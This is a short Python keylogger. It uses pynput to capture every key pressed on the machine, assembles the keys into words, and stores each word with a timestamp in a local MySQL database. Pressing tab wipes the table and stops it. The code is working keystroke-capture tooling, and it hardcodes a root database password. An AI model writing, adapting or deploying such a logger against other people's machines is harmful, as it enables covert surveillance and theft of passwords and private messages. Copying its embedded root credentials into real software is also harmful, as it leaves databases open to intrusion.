from pynput import keyboard
import mysql.connector	
import mysql.connector
import time

mydb = mysql.connector.connect(
  host="localhost",
  user="root",
  passwd="sameed123",
  database="pylogger"
)
mycursor = mydb.cursor()	
def on_release(key):
    letter = key
    if letter == keyboard.Key.tab:	
        sql = "DELETE FROM words" 
        mycursor.execute(sql)
        mydb.commit()
        sql = "ALTER TABLE words AUTO_INCREMENT = 1"
        mycursor.execute(sql)
        mydb.commit()
        return False
letters = []
words = []
def log(key):		 
	letter = key
	if letter != keyboard.Key.space and letter != keyboard.Key.enter and letter != keyboard.Key.tab and letter != keyboard.Key.up and letter != keyboard.Key.left and letter != keyboard.Key.right and letter != keyboard.Key.down and letter != keyboard.Key.backspace:	
		letters.append(letter)	
	if letter == keyboard.Key.backspace:
		if len(letters) > 0:
			del letters[-1]
	if letter == keyboard.Key.space or letter == keyboard.Key.enter or letter == keyboard.Key.tab:			
		print(letters)
		named_tuple = time.localtime() # asd 	asdasd dsddsd  	 
		time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
		word = ''.join(map(str, letters))
		word = word.replace("'","")
		sql = "INSERT INTO words (word, typed) VALUES (%s, %s)"
		val = (word, time_string)
		mycursor.execute(sql, val)
		mydb.commit()
		print("1 record inserted, ID:", mycursor.lastrowid)	
		del letters[:]
	print(letters)
	print(words)

with keyboard.Listener(
        on_press=log,
        on_release=on_release
        ) as listener:
    listener.join()
for val in words:
	print(val)